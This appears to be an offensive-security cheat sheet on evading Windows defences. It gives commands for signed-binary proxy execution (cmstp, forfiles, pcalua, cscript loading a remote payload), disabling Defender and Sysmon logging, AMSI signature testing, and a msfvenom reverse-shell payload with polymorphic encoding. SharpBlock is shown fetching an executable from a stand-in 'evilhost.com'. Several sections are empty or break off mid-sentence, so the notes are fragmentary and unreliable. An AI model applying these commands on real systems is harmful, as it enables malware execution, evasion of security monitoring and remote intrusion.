#### Command Line

##### Linux

/usr/bin/p?ng   # This equals /usr/bin/ping
/usr/bin/who*mi # This equals /usr/bin/whoami
/usr/bin/n[c]   # This equals /usr/bin/nc

##### Windows

https://pentestlab.blog/2020/07/06/indirect-command-execution/

The forfiles command lets you run a command on or pass arguments to multiple files.

pcalua.exe -a vuln.exe

SyncAppvPublishingServer.vbs "n; Start-Process C:\tmp\pentestlab.exe"

cmd.exe /c "pentestlab.blog /../../../../../../../../../../windows/explorer.exe" /root,C:\tmp\pentestlab.exe
https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/

#### Windows Event Log

#### Signed Binary Proxy Execution

We may need to bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.

##### Compiled HTML files

CHM files are commonly distributed as part of the Microsoft HTML Help system.
CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.

###### hh.exe

[hh] is a binary used for processing chm files in Windows

Paths:
C:\Windows\System32\hh.exe
C:\Windows\SysWOW64\hh.exe

https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/

Prevent execution of hh.exe though an Application Control mechanism
Monitor and analyze the execution and arguments of hh.exe.

##### Control Panel items

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.

Monitor and analyze activity related to items associated with CPL files

https://attack.mitre.org/techniques/T1218/002/

##### Setup Information file

An INF file or Setup Information file is a plain-text file used by Microsoft Windows for the installation of software and drivers.

[CMSTP](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp) is a binary which is associated with the Microsoft Connection Manager Profile Installer.

```inf
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```

```bash
cmstp.exe /s .\f.inf
```

##### SCT files



#### Signed Script Proxy Execution

Windows Script Host is an command line scripting engine present on many Windows System.
Windows Script Host can call Windows COM components unlocking us a vast array of potential attack vectors.

Windows Script Host can be either run:

- In protection-mode, using the wscript.exe

WSH scripts are written in either JScript or VBScript as uncompiled text files with extensions of “.js” or “.vbs” respectively.

We may need to 

[cscript]() starts a script to run in a command-line environment.

cscript //E:jscript \\webdavserver\folder\payload.txt

wscript


https://www.sans.org/reading-room/whitepapers/testing/windows-script-host-hack-windows-33583

#### AppLocker

https://lolbas-project.github.io/

##### forfiles

The [forfiles](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/forfiles) is a command utility which can select multiple files and run a command on them.
It is typically used in batch jobs but it could be abused to execute an arbitrary command or an executable. 

- **/P**: Specifies the path from which to start the search.
- **/M**: Searches files according to the specified search mask.
- **/C**: Runs the specified command on each file.

```bash
forfiles /P c:\windows\system32 /M calc.exe /C C:\tmp\pentestlab.exe
```

The program compatibility assistant is a windows utility that runs when it detects a software with compatibility issues. The utility is located in “C:\Windows\System32” and can execute commands with the “-a” argument.

##### Program Compatibility Assistant

```bash
# Open the target .EXE using the Program Compatibility Assistant.
pcalua.exe -a calc.exe
# Open the target .DLL file with the Program Compatibilty Assistant.
pcalua.exe -a \\server\payload.dll

```

#### AMSI

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) Takes a binary as input (either from a file on disk or a URL), splits it until it pinpoints that exact bytes that the target engine will flag on and prints them to the screen.

```bash
ThreatCheck.exe -f malicious.bin -e AMSI
```

https://github.com/rasta-mouse/AmsiScanBufferBypass

#### Defender

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) Takes a binary as input (either from a file on disk or a URL), splits it until it pinpoints that exact bytes that the target engine will flag on and prints them to the screen.

```bash
ThreatCheck.exe -f malicious.exe -e Defender
```

#### LSA Protection

LSA Protection

!processProtect /process:mimikatz.exe

risky action and may very well cause system instability and/or crash (aka BSOD)

#### Sysmon

Within Sysmon, Win32 System call [ReportEventW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-reporteventw) is used to report the event. But admin privileges is required to play around that area.
When analysing more in depth, the calls at one point [NtTraceEvent]() which is defined inside ntoskrnl.exe

Kernel driver signing enforcement
PatchGuard

With [Ghost In The Logs](https://github.com/bats3c/Ghost-In-The-Logs) we can evade sysmon and windows event logging.

```bash
# 1. Loading the driver and setting the hook
.\gitl.exe load
# 2. Enabling the hook (disabling all logging)
.\gitl.exe enable
# 3. Getting the status of the hook
.\gitl.exe status
```

For more information, refer to the blog post about the author of this tool, [Batsec](https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/)

#### Exe

##### Encoding

Encoders are tools that allow you to avoid characters in an exploit that would break it.
Some Metasploit encoders create polymorphic code, or mutating code, which ensures that the encoded payload looks different each time the payload is generated.

One of these core techniques is the Shikata Ga Nai (SGN) payload encoding scheme.

SGN is a polymorphic XOR additive feedback encoder. It is polymorphic in that each creation of encoded shellcode is going to be different from the next. It accomplishes this through a variety of techniques such as dynamic instruction substitution, dynamic block ordering, randomly interchanging registers, randomizing instruction ordering, inserting junk code, using a random key, and randomization of instruction spacing between other instructions.

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o /root/Desktop/metasploit/IamNotBad.exe
```

[Here](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) you can find a full article which explains it deeper.

##### Encryption

[Hyperion](http://www.phobosys.de/hyperion.html) is a runtime crypter. It accepts Windows portable executables (PE) as input and transforms them into an encrypted version (preserving its original behaviour). The encrypted file decrypts itself on startup and executes it’s original content. This approach provides a protection of binaries against reverse engineering.

Hyperion was written to run on Windows systems, but we can run it on Kali Linux with the Wine program

```bash
wine hyperion /path/to/file.exe encryptedfile.exe
```


Veil-Evasion



##### Packing

EXE Packer is a simple-to-use program that aims to compress EXE and DLL files, in order to reduce space on the hard drive and to enable the files in question to unpack automatically at runtime.

[UPX](https://upx.github.io/) is a free, portable, extendable, high-performance executable packer for several executable formats.

UPX offers ten different compression levels from -1 to -9, and --best.  The default compression level is -8 for files smaller than 512 KiB, and -7 otherwise.

- Compression levels **1**, **2** and **3** are pretty fast
- Compression levels **4**, **5** and **6** achieve a good time/ratio performance.
- Compression levels **7**, **8** and **9** favor compression ratio over speed.
- Compression level **--best** may take a long time.

Note that compression level **--best** can be somewhat slow for large files, but you definitely should use it when releasing a final version of your program.

#### Virtualized Environment

https://www.aldeid.com/wiki/ScoopyNG

#### Bypassing

#### Windows Protection

##### Microsoft Defender

```bash
Set-MpPreference -DisableRealtimeMonitoring $true
```

##### Antimalware Scan Interface (AMSI)

The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine.

The AMSI feature is integrated into these components of Windows 10.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

![AMSI](asmsi9proper.png)

##### Windows Lockdown Policy

Dynamic code execution allows applications to be extended with code that is not compiled into the application.

Windows Lockdown Policy verify the digital signature of dynamic code

##### UAC

https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692

(Metasploit)  use exploit/windows/local/bypassuac 

##### Applocker Bypass

###### Msbuild.exe

MSBuild was introduced in order to enable developers to build products in environments where Visual Studio is not installed.
Specifically this binary can compile XML C# project files.

As MSBuild is a trusted binary by Microsoft, we can use it to build reverse shell

```bash

```

c:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe

https://pentestlab.blog/tag/control-panel/

 In a windows system when a user is opening the control panel several CPLs files are loaded. The list of these CPL’s files is obtained from the Registry.



#### Common Techniques

##### PowerShell

```bash
"Invoke-"+"Evil"
```

##### SharpBlock

[SharpBlock](https://github.com/CCob/SharpBlock) is a method of bypassing EDR's active projection DLL's by preventing entry point execution) is a method of bypassing EDR's active projection DLL's by preventing entry point execution.

```bash
SharpBlock -e http://evilhost.com/evil.exe -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a 
```

Here below are the options:

- **-e**: Program to execute (default cmd.exe)
- **-a**: Arguments for program (default null)
- **-n**: Name of DLL to block
- **-c**: Copyright string to block
- **-p**: Product string to block
- **-d**: Description string to block


### Todo

- [darkarmour](https://github.com/bats3c/darkarmour)
- https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f


https://medium.com/@gorkemkaradeniz/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
